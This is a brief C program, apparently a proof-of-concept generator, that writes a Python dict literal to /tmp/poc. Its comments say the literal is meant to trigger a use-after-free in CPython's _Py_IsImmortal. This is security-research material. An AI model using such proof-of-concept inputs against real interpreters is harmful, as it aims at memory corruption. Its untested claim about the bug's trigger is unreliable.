#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    // Strategy: Use a dict literal with a single key that is a large integer (e.g., 2^30+1)
    // to ensure it's not immortal. Then free the dict and trigger the UAF in _Py_IsImmortal.
    // The key must be unique and not cached. Use 2^30 + 1 = 1073741825.
    // Format: {1073741825: 0}
    fprintf(f, "{1073741825: 0}");
    fputc('\0', f);  // null terminator

    fclose(f);
    return 0;
}